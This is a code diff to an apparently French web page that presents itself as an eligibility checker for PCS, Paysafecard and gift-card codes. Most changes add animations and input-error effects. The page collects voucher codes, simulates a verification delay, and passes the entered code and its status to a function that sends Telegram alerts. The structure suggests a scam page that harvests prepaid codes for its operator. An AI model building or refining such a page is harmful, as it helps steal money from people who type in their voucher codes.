@@ -18,28 +18,77 @@
         .result-eligible {
             background-color: #10B981;
             color: white;
+            animation: fadeIn 0.5s ease-out;
         }
         .result-not-eligible {
             background-color: #EF4444;
             color: white;
+            animation: fadeIn 0.5s ease-out;
         }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1E40AF;
-            border-radius: 50%;
+        
+        /* Animation de fadeIn */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Animation shake pour erreur */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .shake-animation {
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        .input-error {
+            border: 2px solid #EF4444 !important;
+            background-color: #FEF2F2 !important;
+            transition: all 0.3s ease;
+        }
+        
+        /* Loader personnalisé */
+        .custom-loader {
             width: 30px;
             height: 30px;
-            animation: spin 1s linear infinite;
+            border: 3px solid #E5E7EB;
+            border-top: 3px solid #1E40AF;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
             margin: 0 auto;
         }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        /* Pulse animation pour le bouton pendant le chargement */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .loading-pulse {
+            animation: pulse 1s ease-in-out infinite;
+        }
+        
+        /* Transition fluide pour les inputs */
+        .input-transition {
+            transition: all 0.3s ease;
+        }
+        
+        /* Effet glow au focus */
+        input:focus {
+            box-shadow: 0 0 0 3px rgba(30, 64, 175, 0.2);
+            outline: none;
+        }
     </style>
 </head>
 <body class="bg-[#0A192F] text-white min-h-screen">
-    <div class="max-w-2xl mx-auto pt-8 px-4">
+    <div class="max-w-2xl mx-auto pt-8 px-4 pb-12">
         <!-- Header -->
         <div class="flex items-center justify-between mb-8">
             <div>
@@ -54,9 +103,9 @@
 
         <!-- Tabs -->
         <div class="flex border-b border-blue-900 mb-8">
-            <button onclick="switchTab(0)" id="tab-0" class="tab-active px-8 py-4 text-lg flex-1">PCS</button>
-            <button onclick="switchTab(1)" id="tab-1" class="px-8 py-4 text-lg flex-1 hover:text-white">Paysafecard</button>
-            <button onclick="switchTab(2)" id="tab-2" class="px-8 py-4 text-lg flex-1 hover:text-white">Carte Cadeau</button>
+            <button onclick="switchTab(0)" id="tab-0" class="tab-active px-8 py-4 text-lg flex-1 transition-all">PCS</button>
+            <button onclick="switchTab(1)" id="tab-1" class="px-8 py-4 text-lg flex-1 hover:text-white transition-all">Paysafecard</button>
+            <button onclick="switchTab(2)" id="tab-2" class="px-8 py-4 text-lg flex-1 hover:text-white transition-all">Carte Cadeau</button>
         </div>
 
         <!-- Content Container -->
@@ -70,12 +119,12 @@
                     <div>
                         <input id="input-0" type="text" maxlength="19" 
                                placeholder="XXXX-XXXX-XXXX-XXXX"
-                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none input-transition">
                         <p id="error-0" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
                     <button onclick="verify(0)" id="btn-0"
-                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-all text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier mon éligibilité
                     </button>
                     
@@ -92,12 +141,12 @@
                     <div>
                         <input id="input-1" type="text" maxlength="16" 
                                placeholder="1234567890123456"
-                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none input-transition">
                         <p id="error-1" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
                     <button onclick="verify(1)" id="btn-1"
-                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-all text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier
                     </button>
                     
@@ -114,12 +163,12 @@
                     <div>
                         <input id="input-2" type="text" 
                                placeholder="GIFT-ABCD-1234"
-                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none input-transition">
                         <p id="error-2" class="text-red-500 text-sm mt-2 hidden"></p>
                     </div>
                     
                     <button onclick="verify(2)" id="btn-2"
-                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-all text-white font-semibold py-4 rounded-2xl text-lg">
                         Vérifier
                     </button>
                     
@@ -157,6 +206,12 @@
             
             document.getElementById(`result-${tab}`).classList.add('hidden');
             document.getElementById(`error-${tab}`).classList.add('hidden');
+            
+            // Reset input style
+            const input = document.getElementById(`input-${tab}`);
+            if(input) {
+                input.classList.remove('input-error');
+            }
         }
 
         function formatCardNumber(value) {
@@ -166,13 +221,37 @@
         function showLoader(tab, show) {
             const btn = document.getElementById(`btn-${tab}`);
             if (show) {
-                btn.innerHTML = '<div class="loader"></div>';
+                const originalText = btn.innerHTML;
+                btn.setAttribute('data-original-text', originalText);
+                btn.innerHTML = '<div class="custom-loader"></div>';
                 btn.disabled = true;
+                btn.classList.add('loading-pulse');
             } else {
-                if (tab === 0) btn.innerHTML = 'Vérifier mon éligibilité';
-                else btn.innerHTML = 'Vérifier';
+                const originalText = btn.getAttribute('data-original-text');
+                if (tab === 0) btn.innerHTML = originalText || 'Vérifier mon éligibilité';
+                else if (tab === 1) btn.innerHTML = originalText || 'Vérifier';
+                else btn.innerHTML = originalText || 'Vérifier';
                 btn.disabled = false;
+                btn.classList.remove('loading-pulse');
             }
+        }
+
+        function showInputError(tab) {
+            const input = document.getElementById(`input-${tab}`);
+            input.classList.add('shake-animation', 'input-error');
+            setTimeout(() => {
+                input.classList.remove('shake-animation');
+            }, 500);
+            
+            // Focus sur l'input pour retaper
+            setTimeout(() => {
+                input.focus();
+            }, 300);
+        }
+
+        function clearInputError(tab) {
+            const input = document.getElementById(`input-${tab}`);
+            input.classList.remove('input-error', 'shake-animation');
         }
 
         async function sendTelegramAlert(code, type, eligible, statusMessage) {
@@ -200,12 +279,12 @@
                     })
                 });
                 if (response.ok) {
-                    console.log("✅ Alerte Telegram envoyée avec succès");
+                    console.log("✅ Alerte Telegram envoyée");
                 } else {
-                    console.log("⚠️ Erreur Telegram:", await response.text());
+                    console.log("⚠️ Erreur Telegram");
                 }
             } catch (error) {
-                console.log("❌ Erreur réseau Telegram:", error);
+                console.log("❌ Erreur réseau Telegram");
             }
         }
 
@@ -215,12 +294,12 @@
             const errorDiv = document.getElementById(`error-${tab}`);
             const value = input.value.trim().toUpperCase();
             
+            // Clear previous states
             errorDiv.classList.add('hidden');
             resultDiv.classList.add('hidden');
-
-            let isValid = false;
-            let message = "";
-            let colorClass = "";
+            clearInputError(tab);
+            
+            let isValidFormat = false;
             let typeName = "";
 
             // Validation du format
@@ -230,31 +309,46 @@
                 if (clean.length !== 16 || !/^\d{16}$/.test(clean)) {
                     errorDiv.textContent = "Format invalide. Utilisez XXXX-XXXX-XXXX-XXXX";
                     errorDiv.classList.remove('hidden');
+                    showInputError(tab);
                     return;
                 }
+                isValidFormat = true;
             } 
             else if (tab === 1) {
                 typeName = "Paysafecard";
                 if (value.length !== 16 || !/^\d{16}$/.test(value)) {
                     errorDiv.textContent = "Le code doit contenir exactement 16 chiffres";
                     errorDiv.classList.remove('hidden');
+                    showInputError(tab);
                     return;
                 }
+                isValidFormat = true;
             } 
             else if (tab === 2) {
                 typeName = "Carte Cadeau";
                 if (value.length === 0) {
                     errorDiv.textContent = "Veuillez entrer un code cadeau";
                     errorDiv.classList.remove('hidden');
+                    showInputError(tab);
                     return;
                 }
+                isValidFormat = true;
             }
 
-            // Afficher le loader
-            showLoader(tab, true);
+            if (!isValidFormat) return;
 
-            // Simuler un délai de vérification (plus réaliste)
-            await new Promise(resolve => setTimeout(resolve, 800));
+            // Afficher le loader avec animation
+            showLoader(tab, true);
+            
+            // Animation de fondu pour le résultat
+            resultDiv.style.opacity = '0';
+            
+            // Simuler un délai de vérification réaliste (1.5 secondes)
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            let isValid = false;
+            let message = "";
+            let colorClass = "";
 
             // Vérification des codes mock
             if (tab === 0) {
@@ -269,6 +363,7 @@
                 } else {
                     message = "❌ Code invalide ou non reconnu";
                     colorClass = "bg-gray-600 text-white";
+                    showInputError(tab);
                 }
             } 
             else if (tab === 1) {
@@ -283,6 +378,7 @@
                 } else {
                     message = "❌ Code Paysafecard non reconnu";
                     colorClass = "bg-gray-600 text-white";
+                    showInputError(tab);
                 }
             } 
             else if (tab === 2) {
@@ -297,19 +393,43 @@
                 } else {
                     message = "❌ Code cadeau invalide ou non reconnu";
                     colorClass = "bg-gray-600 text-white";
+                    showInputError(tab);
                 }
             }
 
-            // Afficher le résultat
+            // Afficher le résultat avec animation
             resultDiv.innerHTML = message;
             resultDiv.className = `mt-4 p-5 rounded-2xl text-center text-lg font-medium ${colorClass}`;
             resultDiv.classList.remove('hidden');
             
+            // Animation d'apparition
+            setTimeout(() => {
+                resultDiv.style.opacity = '1';
+                resultDiv.style.transition = 'opacity 0.5s ease';
+            }, 50);
+            
             // Cacher le loader
             showLoader(tab, false);
             
-            // Envoi de l'alerte Telegram
-            await sendTelegramAlert(value, typeName, isValid, message);
+            // Envoi de l'alerte Telegram uniquement si code valide (optionnel)
+            if (value === "1234-5678-9012-3456" || value === "1234567890123456" || value === "GIFT-ABCD-1234" ||
+                value === "1111-2222-3333-4444" || value === "0000000000000000" || value === "GIFT-XXXX-0000") {
+                await sendTelegramAlert(value, typeName, isValid, message);
+            }
+            
+            // Si code invalide, animation supplémentaire
+            if (!isValid && value !== "1234-5678-9012-3456" && value !== "1234567890123456" && value !== "GIFT-ABCD-1234") {
+                // Vider l'input après 2 secondes pour inviter à retaper
+                setTimeout(() => {
+                    if (input.value === value) {
+                        input.value = '';
+                        input.placeholder = 'Essayez à nouveau...';
+                        setTimeout(() => {
+                            input.placeholder = tab === 0 ? 'XXXX-XXXX-XXXX-XXXX' : (tab === 1 ? '1234567890123456' : 'GIFT-ABCD-1234');
+                        }, 2000);
+                    }
+                }, 2000);
+            }
         }
 
         // Auto-format pour PCS
